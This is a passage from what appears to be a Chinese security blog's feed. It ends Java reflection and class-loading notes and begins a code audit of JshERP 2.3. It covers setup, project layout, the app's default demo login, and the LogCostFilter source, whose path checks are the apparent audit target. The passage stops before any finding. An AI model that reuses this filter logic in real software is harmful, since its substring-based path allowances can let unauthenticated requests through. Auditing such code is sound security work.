&#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理角色，现在没有p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//设置代理对象</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//动态生成代理类</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4、类的动态加载"><a href="#4、类的动态加载" class="headerlink" title="4、类的动态加载"></a>4、类的动态加载</h1><blockquote><p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p><p><font style="color:rgb(60, 60, 67);">类加载过程详解</font></p><p><a href="https://javaguide.cn/java/jvm/class-loading-process.html">https://javaguide.cn/java/jvm/class-loading-process.html</a></p></blockquote><h3 id="类加载过程："><a href="#类加载过程：" class="headerlink" title="类加载过程："></a>类加载过程：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png"></p><ul><li>**加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象</li><li>**链接：**将java类二进制数据合并到 JRE中<ul><li>**验证：**确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>**准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配</li><li>**解析：**虚拟机将常量池内的符号引用替换为直接引用的过程</li></ul></li><li>**初始化：**执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。<code>&lt;clinit&gt; ()</code>方法会将该类的静态变量合并。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(A.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        1、加载到内存，会在堆产生一个类对应的 Class 对象</span><br><span class="hljs-comment">        2、链接，链接结束后 m=0</span><br><span class="hljs-comment">        3、初始化</span><br><span class="hljs-comment">            &lt;clinit&gt;()&#123;</span><br><span class="hljs-comment">                System.out.println(&quot;A类静态代码块初始化&quot;);</span><br><span class="hljs-comment">                m = 300;</span><br><span class="hljs-comment">                m = 100;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            m = 100</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类静态代码块初始化&quot;</span>);<br>        m = <span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类加载器："><a href="#类加载器：" class="headerlink" title="类加载器："></a>类加载器：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">ppackage com.kuang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//获取系统类的加载器的父类加载器-&gt;扩展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//获取扩展类加载器的父类加载器--&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//测试当前类是哪个类加载器加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//测试 jdk 内部的类是谁加载的</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//获得系统类加载器可以加载的路径</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\access-bridge-64.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jce.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\resources.jar;</span><br><span class="hljs-comment">        D:\Java\jdk1.8\jre\lib\rt.jar;</span><br><span class="hljs-comment">        D:\JavaCode\study_code\annotation&amp;reflection\annotation\target\classes;</span><br><span class="hljs-comment">        C:\Users\SZZY\AppData\Local\Programs\IntelliJ IDEA Ultimate\lib\idea_rt.jar</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png"></p><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>参考：<a href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p><p><a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">https://www.cnblogs.com/luckforefforts/p/13642685.html</a></p><p><font style="color:rgb(89, 97, 114);">如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</font></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><font style="color:rgb(34, 34, 38);">java序列化与反序列化全讲解</font></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang&#x2F;article&#x2F;details&#x2F;107621010</a></p><p><font style="color:rgb(37, 41, 51);">为什么HashMap要自己实现writeObject和readObject方法？</font></p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p><p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font></p><p><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p><p><font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font></p><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华夏ERP 2.3 代码审计</title>
    <link href="/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8， </p><p>数据库新建jsh_erp数据库，导入sql文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">IDEA 的 JDK 版本切换为1.8</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png"></p><p>Maven构建</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png"></p><p>运行 ErpApplication.java 启动程序</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png"></p><h1 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png"></p><p>这个项目的结构更像是 MVC 架构（ Mapper&#x2F;MapperXML； Controller  ），又增加了  Service 层 。</p><ul><li>Maven Assembly 插件，用于帮助打包； assembly.xml  是打包的配置文件</li><li>bin 中的文件都是 jshERP 的运行脚本</li><li>resources&#x2F;mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书”  </li><li>logback-spring.xml：日志文件输出配置</li><li>java<ul><li>config<ul><li><font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  插件管理器 Bean</font></li><li><font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  配置插件系统的运行环境和参数  </font></li><li><font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      用于生成 RESTful API 文档 , 提供文档元信息  </font></li><li><font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  项目数据库访问的</font>统一拦截器和插件配置中心</li><li>WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效</li></ul></li><li>constants     <ul><li>BusinessConstants  <font style="color:#080808;background-color:#ffffff;">业务字典类</font></li><li><font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    异常与返回码管理类  </font></li></ul></li><li>controller      Web 层接口  </li><li>datasource      数据源和数据库访问配置  </li><li>exception    异常处理  </li><li>filter<ul><li>LogCostFilter   自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理</li></ul></li><li>service     业务逻辑层  </li><li>utils    工具类  </li><li>ErpApplication.java    入口类，参考<a href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-注解 @SpringBootApplication 分析</a></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-comment">//MyBatis Mapper 接口扫描路径</span><br><span class="hljs-meta">@MapperScan(&quot;com.jsh.erp.datasource.mappers&quot;)</span><br><span class="hljs-meta">@ServletComponentScan</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErpApplication</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(ErpApplication.class, args);<br>        <span class="hljs-type">Environment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> context.getBean(Environment.class);<br>        System.out.println(<span class="hljs-string">&quot;启动成功，访问地址：http://&quot;</span> + ComputerInfo.getIpAddr() + <span class="hljs-string">&quot;:&quot;</span><br>                           + environment.getProperty(<span class="hljs-string">&quot;server.port&quot;</span>) + <span class="hljs-string">&quot;，测试用户：jsh，密码：123456&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1、LogCostFilter-java"><a href="#1、LogCostFilter-java" class="headerlink" title="1、LogCostFilter.java"></a>1、LogCostFilter.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;LogCostFilter&quot;,</span><br><span class="hljs-meta">    //过滤器对所有路径都生效</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">    initParams = &#123;</span><br><span class="hljs-meta">        //要忽略的静态资源</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">        //允许未登录访问的路径</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;filterPath&quot;, value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-comment">//将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//未登录时允许访问的页面</span><br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>                                   requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// ignoredList</span><br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// allowUrls</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//if 条件都不满足，重定向到 /login.html</span><br>        